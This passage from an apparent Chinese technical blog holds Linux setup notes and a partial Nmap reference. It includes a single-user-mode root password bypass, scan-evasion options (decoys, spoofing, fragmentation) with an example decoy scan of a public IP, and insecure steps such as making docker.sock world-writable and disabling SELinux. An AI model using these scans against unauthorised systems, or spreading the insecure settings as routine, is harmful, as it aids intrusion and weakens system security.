class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start telnet.socket</span><br></pre></td></tr></table></figure><h3 id="docker-Centos8"><a href="#docker-Centos8" class="headerlink" title="docker(Centos8)"></a>docker(Centos8)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2</span><br><span class="line"> </span><br><span class="line">sudo yum-config-manager  --add-repo   https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#国内</span></span></span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo </span><br><span class="line"> </span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker &amp;&amp; sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h4 id="docker用户组"><a href="#docker用户组" class="headerlink" title="docker用户组"></a>docker用户组</h4><p>查看是否存在docker组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/group | grep docker</span><br></pre></td></tr></table></figure><p>创建分组，将用户添加到这个分组里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd -g 999 docker #-g 999为组ID，也可以不指定</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker testuser</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><blockquote><p>提示<code>get ......dial unix /var/run/docker.sock</code>权限不够，则修改<code>/var/run/docker.sock</code>权限</p></blockquote><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install docker-compose</span><br></pre></td></tr></table></figure><blockquote><p>更多安装方式参考：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure><blockquote><p>报错：<code>Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-*</code></p></blockquote><h3 id="centos6绕过密码root登录"><a href="#centos6绕过密码root登录" class="headerlink" title="centos6绕过密码root登录"></a>centos6绕过密码root登录</h3><p><a href="https://www.cnblogs.com/zoe233/p/11795253.html">https://www.cnblogs.com/zoe233/p/11795253.html</a></p><p>开机按ESC</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105140953911-211643204.png" alt="img"></p><p>按 e 键进入编辑模式；</p><p>选择Kernel /vmlinz-2.6.32-696.e16… … 后按 e 键编辑此项；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141006477-489960969.png" alt="img"></p><p>进入该编辑模式后，在quiet后面输入 simple 或者 1 然后回车；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141019059-229246587.png" alt="img"></p><p>按 b 键进入单用户模式；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141028767-381730791.png" alt="img"></p><p>passwd root 输入两次新密码；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141041687-334540775.png" alt="img"></p><p>使用 reboot 命令重启；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141053404-2062972422.png" alt="img"></p><h3 id="禁用selinux"><a href="#禁用selinux" class="headerlink" title="禁用selinux"></a>禁用selinux</h3><ul><li>打开配置文件<code>/etc/selinux/config</code>或者其符号链接<code>/etc/sysconfig/selinux</code>。</li><li>将<code>selinux =enforcing</code> 改成<code>selinux =disabled</code></li><li>重新启动系统或者使用<code>setEnforce 0</code>立即调用更改。</li></ul><h2 id="Ubuntu初始化"><a href="#Ubuntu初始化" class="headerlink" title="Ubuntu初始化"></a>Ubuntu初始化</h2><h3 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h3><p>临时配置ip，立即生效，但重启后无效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo ifconfig eth0 192.168.11.88 netmask 255.255.255.0 //设置网卡eth0的IP地址和子网掩码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo route add default gw 192.168.1.1 //设置网关</span></span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/network/interfaces</code>，重启后生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo vi /etc/network/interfaces</span></span><br><span class="line">添加以下内容：</span><br><span class="line"></span><br><span class="line">auto eth0 #设置自动启动eth0接口</span><br><span class="line">iface eth0 inet static #配置静态IP</span><br><span class="line">address 192.168.11.88  #IP地址 </span><br><span class="line">netmask 255.255.255.0  #子网掩码</span><br><span class="line">gateway 192.168.11.1   #默认网关</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/davidhzq/article/details/102991577">https://blog.csdn.net/davidhzq/article/details/102991577</a></p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl status ssh</span><br><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p><a href="https://blog.csdn.net/u012308586/article/details/102953882">https://blog.csdn.net/u012308586/article/details/102953882</a></p><p>查看的Ubuntu版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">Ubuntu 20.04.2 LTS \n \l</span><br></pre></td></tr></table></figure><p>跟换成阿里云的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse&quot;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure><h3 id="设置时间-amp-时区"><a href="#设置时间-amp-时区" class="headerlink" title="设置时间&amp;时区"></a>设置时间&amp;时区</h3><p>设置时区</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tzconfig</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没有命令</span></span><br><span class="line">dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure><p>方式重启后时区改变</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure><p>同步时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装ntpdate工具</span><br><span class="line">sudo apt-get install ntpdate</span><br><span class="line">设置系统时间与网络时间同步</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line">将系统时间写入硬件时间</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h3 id="选择编辑器"><a href="#选择编辑器" class="headerlink" title="选择编辑器"></a>选择编辑器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/log# select-editor </span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run &#x27;select-editor&#x27;.</span><br><span class="line">  1. /bin/ed</span><br><span class="line">  2. /bin/nano        &lt;---- easiest</span><br><span class="line">  3. /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line">Choose 1-3 [2]: 3</span><br></pre></td></tr></table></figure><h3 id="重装vim"><a href="#重装vim" class="headerlink" title="重装vim"></a>重装vim</h3><p>在Ubuntu14中会出现下图情况：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914150041796.png" alt="image-20210914150041796"></p><p>重装以下vim即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove vim-common</span><br></pre></td></tr></table></figure><blockquote><p>这里是vim-common不是vim</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install vim </span><br></pre></td></tr></table></figure><h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p><code>gedit /etc/passwd</code> ,找到代表你的那一行，修改用户名为新的用户名。 注意：只修改用户名！后面的全名、目录等不要动！</p><p><code>gedit /etc/shadow</code>，找到代表你的那一行，修改用户名为新用户名  </p><p><code>gedit /etc/group</code>，你应该发现你的用户名在很多个组中，全部修改！</p><h4 id="修改ubuntu-后面的主机名"><a href="#修改ubuntu-后面的主机名" class="headerlink" title="修改ubuntu@后面的主机名"></a>修改ubuntu@后面的主机名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1625132400579-1ce6a872-27a2-40dc-91da-f291062ee7f2.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hostname</span><br></pre></td></tr></table></figure><h3 id="更换系统内核"><a href="#更换系统内核" class="headerlink" title="更换系统内核"></a>更换系统内核</h3><h4 id="查看当前系统版本"><a href="#查看当前系统版本" class="headerlink" title="查看当前系统版本"></a>查看当前系统版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h4 id="查看内核"><a href="#查看内核" class="headerlink" title="查看内核"></a>查看内核</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="安装VMtools"><a href="#安装VMtools" class="headerlink" title="安装VMtools"></a>安装VMtools</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp VMwareTools-XXXX ~</span><br></pre></td></tr></table></figure><blockquote><p>挂载光盘文件权限为只读，且无法更改</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 VMwareTools-XXXX</span><br><span class="line">tar zxvf VMwareTools-XXXX</span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure><p>安装成功后还无法复制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vmware-user</span><br></pre></td></tr></table></figure><blockquote><p>复制粘贴、拖拽、窗口缩放等问题都是因为这个进程没有启动起来,在终端输入上面的命令</p></blockquote><h2 id="Kail初始化"><a href="#Kail初始化" class="headerlink" title="Kail初始化"></a>Kail初始化</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.kali.org/get-kali/">kali下载</a></p><h3 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h3><ol><li><p>更改默认编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><blockquote><p>进入图形化界面后（用上下方向键、空格是选择，Tab是切换，*是选中），选中zh_CN.UTF-8，确定后，将zh_CN.UTF-8选为默认。</p></blockquote></li><li><p>安装字体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -y &amp;&amp; apt install xfonts-intl-chinese ttf-wqy-microhei</span><br></pre></td></tr></table></figure></li><li><p>重启系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></li></ol><h3 id="更改源"><a href="#更改源" class="headerlink" title="更改源"></a>更改源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑sources.list文件，并添加以下源，选择自己相对快一点的源。</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不会vim的可以使用图形界面编辑器</span></span><br><span class="line">sudo mousepad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">东软大学源</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">新加坡kali源</span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">163 Kali源</span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line">sudo apt-get clean</span><br><span class="line">sudo apt-get autoclean</span><br></pre></td></tr></table></figure><h3 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ibus ibus-pinyin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152259852.png" alt="image-20211102152259852"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152341120.png" alt="image-20211102152341120"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152508614.png" alt="image-20211102152508614"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .bashrc</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=ibus</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=ibus</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102153948333.png" alt="image-20211102153948333"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="高分辨率调整DPI"><a href="#高分辨率调整DPI" class="headerlink" title="高分辨率调整DPI"></a>高分辨率调整DPI</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102154648400.png" alt="image-20211102154648400"></p><h3 id="当前文件夹搭建简单HTTP服务"><a href="#当前文件夹搭建简单HTTP服务" class="headerlink" title="当前文件夹搭建简单HTTP服务"></a>当前文件夹搭建简单HTTP服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>指定端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>指定后台运行，加&amp;：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>生成的新的进程为当前bash的子进程，当关闭当前bash时，相应的子进程也会被kill掉</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python -m SimpleHTTPServer 8000 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>加nohup，忽略所有的挂断信号，如果当前bash关闭，则当前进程会挂载到init进程下，成为其子进程，这样即使退出当前用户，其8000端口也可以使用。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/p/366383bb.html"/>
      <url>/p/366383bb.html</url>
      
        <content type="html"><![CDATA[<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。</p><h2 id="参数信息"><a href="#参数信息" class="headerlink" title="参数信息"></a>参数信息</h2><p><code>nmap –iflist</code>查看本地主机的<strong>接口信息</strong>(INTERFACES)和<strong>路由信息</strong>(ROUTES)</p><p><code>-A</code> 选项用于使用进攻性方式扫描</p><p><code>-T4</code>指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</p><p><code>-sn</code>只进行<strong>主机发现</strong>，不进行端口扫描</p><p><code>-sO</code>使用IP protocol扫描确定目标机支持的协议类型</p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829190612074.png" alt="image-20210829190612074" style="zoom: 80%;" /><p><code>-p</code> 扫描指定的端口</p><p><code>-sS/sT/sA/sW/sM</code>指定使用 TCP SYN半开放/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</p><p><code>-sU</code>指定使用UDP扫描方式确定目标主机的UDP端口状况</p><p><code>-sY/sZ</code>使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</p><p><code>-PO</code>使用IP协议包探测对方主机是否开启 </p><p><code>-PE/PP/PM</code>使用ICMP echo、ICMP timestamp、ICMP netmask 请求包发现主机</p><p><code>-PS/PA/PU/PY</code>使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</p><p><code>-sN/sF/sX</code>指定使用TCP Null, FIN, and Xmas scans<strong>秘密扫描方式</strong>来协助探测对方的TCP端口状态</p><p><code>-v</code>表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态</p><p><code>-script &lt;script name&gt;</code> 指定扫描脚本</p><h3 id="和ping相关"><a href="#和ping相关" class="headerlink" title="和ping相关"></a>和ping相关</h3><p><code>-Pn</code> 不进行ping扫描（禁ping的时候）</p><p><code>-sP</code> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描</p><p><code>-PI</code> 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</p><h3 id="列表-amp-网段扫描"><a href="#列表-amp-网段扫描" class="headerlink" title="列表&amp;网段扫描"></a>列表&amp;网段扫描</h3><p><code>-iL 1.txt</code>批量扫描1.txt中的目标地址</p><p><code>-sL</code>List Scan列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</p><p><code>nmap 192.168.1.0/24 -exclude 192.168.1.10</code>扫描除192.168.1.0外的该网段的其他地址<br><code>nmap 192.168.1.0/24 -excludefile f:/1.txt</code>扫描除给定文件中的地址以外的其他地址</p><h3 id="减少探测数量类"><a href="#减少探测数量类" class="headerlink" title="减少探测数量类"></a>减少探测数量类</h3><p><code>-F</code> 快速模式，仅扫描TOP 100的端口 </p><p><code>--top-ports &lt;number&gt;</code>扫描开放概率最高的number个端口</p><p><code>--port-ratio &lt;ratio&gt;</code>扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</p><p><code>nmap -sS -sU --top-ports 100 [ip]</code>探测N个最有可能开放的端口</p><h3 id="DNS类"><a href="#DNS类" class="headerlink" title="DNS类"></a>DNS类</h3><p><code>-n</code>表示不进行DNS解析；</p><p><code>-R</code> 表示总是进行DNS解析。</p><p><code>--dns-servers</code>指定DNS服务器</p><p><code>--system-dns</code>指定使用系统的DNS服务器   </p><h3 id="版本探测-sV"><a href="#版本探测-sV" class="headerlink" title="版本探测-sV"></a>版本探测<code>-sV</code></h3><p><code>-sV</code>指定让Nmap进行版本侦测</p><p><code>--version-intensity &lt;level&gt;</code>指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</p><p><code>--version-light</code>指定使用轻量侦测方式 (intensity 2)</p><p><code>--version-all</code>尝试使用所有的probes进行侦测 (intensity 9)</p><p><code>--version-trace</code>显示出详细的版本侦测过程信息</p><h3 id="OS系统探测-O"><a href="#OS系统探测-O" class="headerlink" title="OS系统探测-O"></a>OS系统探测<code>-O</code></h3><p><code>-O</code>指定Nmap进行OS侦测，nmap拥有丰富的系统数据库nmap-os-db，目前可以识别2600多种操作系统与设备类型。</p><p><code>--osscan-limit</code>限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</p><p><code>--osscan-guess</code>大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</p><h3 id="结果输出类"><a href="#结果输出类" class="headerlink" title="结果输出类"></a>结果输出类</h3><p><code>-oX test.xml</code>将扫描结果生成 test.xml 文件，如果中断，则结果打不开</p><p><code>-oA test.xml</code>将扫描结果生成 test.xml 文件，中断后，结果也可保存</p><p><code>-oG test.txt</code>将扫描结果生成 test.txt 文件</p><h3 id="隐藏信息针对防火墙"><a href="#隐藏信息针对防火墙" class="headerlink" title="隐藏信息针对防火墙"></a>隐藏信息针对防火墙</h3><p><code>nmap -sF -T4 192.168.1.0</code> 探测防火墙状态</p><p><code>--badsum</code>使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，<br>说明回复来自防火墙或 IDS/IPS）</p><p><code>-e eth0</code>指定使用eth0网卡进行探测</p><p><code>-f : --mtu &lt;val&gt;</code>指定使用分片、指定数据包的 MTU</p><p><code>-b &lt;FTP relay host&gt;</code> 使用FTP bounce scan扫描方式</p><p><code>-g/--source-port &lt;portnum&gt;</code>使用指定源端口</p><p><code>-D  &lt;decoy1,decoy2[,ME],...&gt;</code>用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</p><p><code>-S &lt;IP_Address&gt;</code>伪装成其他 IP 地址</p><p><code>--ttl &lt;val&gt;</code>设置 time-to-live 时间</p><p><code>--traceroute</code>追踪每个路由节点 </p><p><code>--scanflags &lt;flags&gt;</code>定制TCP包的flags</p><p><code>--data-length &lt;num&gt;</code>填充随机数据让数据包长度达到 Num</p><p><code>--ip-options &lt;options&gt;</code>使用指定的 IP 选项来发送数据包</p><p><code>--spoof-mac &lt;mac address/prefix/vendor name&gt;</code> 伪装 MAC 地址</p><p><code>--data-length &lt;num&gt;</code>填充随机数据让数据包长度达到 Num。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -Pn -D 10.96.10.100,10.96.10.110,ME  -e eth0  -g 5555 202.207.236.3</span><br></pre></td></tr></table></figure><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。</p><ul><li><code>open</code>端口是开放的。</li><li><code>closed</code>端口是关闭的。</li><li><code>filtered</code>端口被防火墙IDS/IPS屏蔽，无法确定其状态。</li><li><code>unfiltered</code>端口没有被屏蔽，但是否开放需要进一步确定。</li><li><code>open|filtered</code>端口是开放的或被屏蔽，Nmap不能识别。</li><li><code>closed|filtered</code>端口是关闭的或被屏蔽，Nmap不能识别</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><h3 id="当探测公网IP时"><a href="#当探测公网IP时" class="headerlink" title="当探测公网IP时"></a>当探测公网IP时</h3><p><strong>nmap -sn</strong></p><p>Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p><ol><li>ICMP echo request</li><li>a TCP SYN packet to port 443(https)</li><li>a TCP ACK packet to port 80(http)</li><li>an 